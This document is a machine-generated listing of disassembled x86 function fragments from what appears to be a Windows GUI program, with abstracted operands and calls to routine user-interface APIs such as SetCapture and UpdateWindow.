add eax 0xffffffe0
jmp sub_435dc0
sub_435a3d
add eax 0xffffffe0
jmp sub_435dc4
sub_435a45
add eax 0xffffffe0
jmp sub_435e4c
sub_435a4d
add eax 0xffffffe0
jmp sub_435f94
sub_435a55
add eax 0xffffffe0
jmp sub_435f98
sub_435a5d
add eax 0xffffffe0
jmp sub_435fb4
sub_435a6f
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40566c
sub_435a79
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405680
sub_435c4d
jmp sub_403960
sub_435c54
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435c90
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403fb0
pop ebx
retn
sub_435d0b
jmp sub_403960
sub_435d12
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435da4
jmp sub_403960
sub_435dab
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435dc0
mov al 0x1
retn
sub_435e3f
jmp sub_403960
sub_435e46
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435f44
jmp sub_403960
sub_435f4b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435f94
mov [ eax + 0xc ] edx
retn
sub_435f98
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_43603c
jmp sub_403960
sub_436043
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436142
jmp sub_403960
sub_436149
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4361c2
jmp sub_403960
sub_4361c9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436254
jmp sub_403960
sub_43625b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43634f
jmp sub_403960
sub_436356
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_436418
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_436364
call EnumWindows
retn
sub_4364aa
jmp sub_403960
sub_4364b1
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4364bc
xor eax eax
retn
sub_4365b5
jmp sub_403960
sub_4365bc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4366a6
jmp sub_403960
sub_4366ad
pop ebp
retn
sub_436702
jmp sub_403960
sub_436709
pop ebp
retn
sub_43788c
jmp r-xdata
sub_43788e
0xe8ffe9ff 0xe7ff
sub_437895
jmp esi
sub_438661
add eax 0xffffff8c
jmp sub_4449f4
sub_438669
add eax 0xffffff8c
jmp sub_4449f8
sub_438671
add eax 0xffffff8c
jmp sub_444ae4
sub_438679
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_438686
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_438693
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_4386a0
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_4386ad
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_4386ba
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_4386c7
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_4386d4
add eax 0xffffff8c
jmp sub_446154
sub_4386e6
add [ esp + 0x4 ] 0xffffff8c
jmp sub_40566c
sub_4386f0
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405680
sub_4389ac
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_438cbf
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_4133c8
retn
sub_438cdc
push 0x15
mov ecx rw-data
call sub_413388
retn
sub_438d74
call GetCapture
call sub_438aac
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_438fd8
push ebx
push eax
push sub_43915c
call sub_41a53c
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_438ff0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_439020
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41a5f0
pop ebx
retn
sub_4390fe
jmp sub_4036ac
sub_439130
xor eax eax
retn
sub_439134
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43914c
retn
sub_439150
mov eax [ rw-data ]
retn
sub_439158
retn
sub_439186
jmp sub_4036ac
sub_43918b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45b724
call sub_403a14
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4391a8
call sub_403464
xor eax eax
mov [ rw-data ] eax
retn
sub_4391b8
call sub_403460
xor eax eax
mov [ rw-data ] eax
retn
sub_4391c8
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403530
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_439278
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_439290
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_4392dc
retn
sub_439494
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403420
pop esi
retn
sub_4394a8
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403420
pop esi
retn
sub_4394bc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4394c8
mov eax 0x4
retn
sub_4394d0
retn
sub_43a0c1
jmp sub_4036ac
sub_43a3ae
jmp sub_403960
sub_43a420
jmp sub_403960
sub_43a42c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43a154
sub_43a5ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d428
retn
sub_43a5c1
jmp sub_403960
sub_43a5e8
jmp sub_403960
sub_43a66a
jmp sub_403960
sub_43a692
jmp sub_403960
sub_43a699
mov esp ebp
pop ebp
retn
sub_43a751
jmp sub_403960
sub_43a7a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43a774
mov [ ebx + 0x58 ] esi
sub_43a8fc
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43a910
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033d4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43a9f9
jmp sub_403960
sub_43aa00
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43aa83
jmp sub_403960
sub_43aa8a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43ae58
xor eax eax
retn
sub_43ae5c
mov al [ eax + 0x58 ]
retn
sub_43ae60
xor eax eax
retn
sub_43ae64
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43ae6c
mov eax [ eax + 0x30 ]
retn
sub_43af10
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43afbc
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43afd4
mov [ eax + 0x5d ] dl
retn
sub_43afd8
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_43ebd0
sub_43afe8
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43b4cb
jmp sub_403960
sub_43b4d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b534
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43b5b8
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43b6d5
jmp sub_403960
sub_43b6dc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b7d8
push eax
xor ecx ecx
mov edx 0xb037
call sub_43cd98
retn
sub_43b999
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403420
sub_43ba4a
jmp sub_403960
sub_43ba51
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43bb28
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43cd98
sub_43bb40
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43cd98
retn
sub_43bb50
push edx
mov edx 0xd
call sub_43cd98
retn
sub_43bb5c
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43bb70
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43bc51
jmp sub_403960
sub_43bc58
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43bc60
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43cd98
sub_43bcd0
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43bce4
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43bcf0
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_43bcf8
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43cd98
sub_43bd1c
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43cd98
sub_43bd40
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43cd98
sub_43bd88
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43bd90
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43cd98
sub_43bdb4
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43cd98
sub_43bdd8
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_43cd98
sub_43bdf4
push ebx
mov ebx eax
call sub_438d74
cmp ebx eax
sete al
pop ebx
retn
sub_43be2c
push esi
mov dl 0x1
mov si 0xffce
call sub_403420
pop esi
retn
sub_43bf76
jmp sub_403960
sub_43bf7d
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c0a0
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_43c014
retn
sub_43c0f4
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_43c108
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_43c1ed
jmp sub_403960
sub_43c20c
xor eax eax
retn
sub_43c210
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43c228
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43c240
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43c258
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_43c274
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_43c28c
retn
sub_43c350
retn
sub_43c354
cmp eax [ rw-data ]
sete al
retn
sub_43c3c8
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_43c4e4
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403420
pop esi
pop ebp
retn 0x4
sub_43c524
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43c7bb
jmp sub_403960
sub_43c7c2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c7cc
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403420
pop esi
retn
sub_43c7e0
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403420
pop esi
retn
sub_43caaf
jmp sub_403960
sub_43cb58
push esi
mov si 0xffee
call sub_403420
pop esi
retn
sub_43cb64
mov al 0x1
retn
sub_43ce3c
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43b220
retn
sub_43ce60
retn
sub_43d079
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416d0c
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_43d094
mov al [ eax + 0x5e ]
xchg edx eax
call sub_419044
retn
sub_43d18c
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43d7a4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43d7ac
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43d7b4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43d86c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d88c
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43bd1c
mov [ ebx + 0x9a ] 0x1
sub_43d8e4
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43bcc0
mov [ ebx + 0x56 ] 0x1
sub_43d908
mov [ edx + 0xc ] 0x1
retn
sub_43d910
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_43cd98
sub_43d928
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_43cd98
sub_43d940
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43dba6
jmp sub_403960
sub_43dbad
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43dbd8
mov eax [ r-xdata ]
retn
sub_43dd74
jmp sub_403960
sub_43dd7b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43de9c
mov eax [ eax + 0xb8 ]
retn
sub_43df04
push ebx
mov ebx eax
mov eax ebx
call sub_43c228
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_43df20
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43e0b8
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43e0e8
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_43e0f0
call sub_43ac8c
retn
sub_43e1f0
jmp sub_403960
sub_43e3b0
jmp sub_403960
sub_43e400
jmp sub_403960
sub_43e438
retn
sub_43e6c1
jmp sub_403960
sub_43e849
jmp sub_403960
sub_43ebab
jmp sub_403960
sub_43ec57
jmp sub_403960
sub_43ec64
inc [ eax + 0x160 ]
retn
sub_43ec6c
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_43ec8c
sub_43ec8c
xor edx edx
call sub_43ebd0
retn
sub_43ed59
jmp sub_403960
sub_43ed60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ee4f
jmp sub_403960
sub_43f376
jmp sub_403960
sub_43f37d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f545
jmp sub_403960
sub_43f54c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f620
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_43f80d
jmp sub_403960
sub_43f814
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_43f904
xor eax eax
retn
sub_43f96c
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43cd98
sub_43fa9a
jmp sub_4036ac
sub_43fbcf
jmp sub_403960
sub_43fbd6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43fbe0
jmp sub_4036ac
sub_43fbe5
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45b724
call sub_403a14
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4401a0
jmp sub_403960
sub_4401a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4401b0
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_4406ae
jmp sub_403960
sub_440700
push ebx
mov ebx eax
call sub_41bad0
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43cd98
pop ebx
retn
sub_44071c
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43cd98
retn
sub_440730
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43cd98
retn
sub_440740
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43cd98
retn
sub_4409ec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4426dc
pop esi
retn
sub_440b00
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_440b50
pop esi
retn
sub_440b14
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_440c3c
pop esi
retn
sub_440b28
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_440b3c
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_440c2f
jmp sub_403960
sub_440c36
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440cc6
jmp sub_403960
sub_440ccd
pop ebx
pop ecx
pop ebp
retn
sub_440cd4
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_440ce4
retn
sub_440ce8
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_440d08
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_440e68
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_440f38
retn
sub_441050
jmp sub_403960
sub_441057
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441122
jmp sub_403960
sub_44114c
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_4411de
jmp sub_403960
sub_4413b0
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_441654
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_441730
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_43f15c
pop esi
retn
sub_4417f4
push esi
mov si 0xffc1
call sub_403420
pop esi
retn
sub_441820
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_441834
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_441848
call sub_43f11c
retn
sub_441850
call sub_43f11c
retn
sub_441858
call sub_43f11c
retn
sub_441900
push ebx
mov ebx eax
mov eax ebx
call sub_43d7b4
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41cc90
mov dx 0xb009
mov eax ebx
call sub_43f15c
pop ebx
retn
sub_441a64
call sub_43f11c
retn
sub_441a6c
call sub_43f11c
retn
sub_441a74
call sub_43f11c
retn
sub_441a7c
call sub_43f11c
retn
sub_441ae0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_441f76
jmp sub_403960
sub_441f7d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44205c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_442200
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43cd98
retn
sub_4422a0
push ebx
mov ebx eax
mov eax ebx
call sub_4426d0
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_4422bc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_442494
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4423cc
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_4424ec
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43cd98
sub_44250c
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43cd98
sub_442530
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_44253c
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43cd98
sub_4425e8
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_44258c
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_4426c4
jmp sub_403960
sub_4426cb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4428ea
jmp sub_403960
sub_4428f1
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4429f8
call sub_43cb68
retn
sub_442e46
jmp sub_403960
sub_442edc
mov eax [ r-xdata ]
retn
sub_443043
jmp sub_403960
sub_443154
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43cd98
sub_44346a
jmp sub_403960
sub_4435ac
test [ eax + 0x52 ] 0x4
setne al
retn
sub_443708
jmp sub_403960
sub_44370f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d428
retn
sub_44372b
jmp sub_403960
sub_443738
retn
sub_44380c
mov [ edx + 0xc ] 0xffffffff
retn
sub_44386a
jmp sub_403960
sub_443871
pop ecx
pop ecx
pop ebp
retn
sub_443911
jmp sub_403960
sub_443918
pop ebx
mov esp ebp
pop ebp
retn
sub_443984
call sub_43f924
retn
sub_443a17
jmp sub_403960
sub_443a1e
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_443bfd
jmp sub_403960
sub_443c04
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443e20
jmp sub_403960
sub_443e74
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_443d60
sub_443fb8
push ebx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_443fd0
push ebx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_4440bc
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44055c
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_444157
jmp sub_403960
sub_44415e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444181
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d428
retn
sub_44417a
jmp sub_403960
sub_444181
pop ebx
